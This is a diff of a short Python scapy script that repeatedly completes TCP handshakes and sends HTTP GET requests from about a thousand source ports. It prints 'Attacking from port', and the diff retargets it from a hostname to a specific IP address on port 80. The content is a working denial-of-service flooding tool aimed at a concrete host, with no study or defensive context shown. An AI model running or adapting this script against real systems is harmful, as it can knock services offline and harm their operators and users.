@@ -2,9 +2,9 @@ from scapy.all import *
 from random import randint
 
 x = "instance2mymachines.xyz"
-y = "www.instance2mymachines.xyz:8080"
-ip = "35.193.17.254"
-dport = 8080
+y = ":8080"
+ip = "144.217.100.106"
+dport = 80
 sp = 3000
 numgets = 1000
 
@@ -21,7 +21,7 @@ for s in range(sp, sp + numgets - 1):
     t.seq = ans.ack
     t.ack = ans.seq + 1
     t.flags = "A"
-    get = "GET / HTTP/1.1\r\nHost: " + y
+    get = "GET / HTTP/1.1\r\nHost: " + ip
     ans = sr1(i / t / get, verbose=0)
     print("Attacking from port ", s)
 print("Done!")
